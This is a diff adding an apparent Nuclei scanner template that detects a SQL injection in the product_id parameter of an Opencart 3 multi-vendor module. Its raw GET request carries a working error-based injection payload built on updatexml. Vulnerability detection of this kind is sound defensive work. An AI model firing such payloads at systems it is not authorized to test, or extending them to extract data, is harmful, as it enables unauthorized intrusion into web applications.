@@ -1,0 +1,25 @@
+id: opencart-sqli-product-id
+info:
+  name: Opencart 3 Multi-Vendor Module Product ID SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The product_id parameter in the /index.php?route=product/product interface of the multi-vendor module in Opencart 3 has a SQL injection vulnerability due to improper parameter filtering.
+  reference:
+    - https://www.exploit-db.com/exploits/50493
+  tags: sqli
+http:
+  - raw:
+      - |
+        GET /index.php?route=product/product&product_id=1%27and+updatexml(1,concat(0x7e,(select+md5(0x5c)),0x7e),1)%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "28d397e87306b8631f"
+        part: body
+      - type: status
+        status:
+          - 200
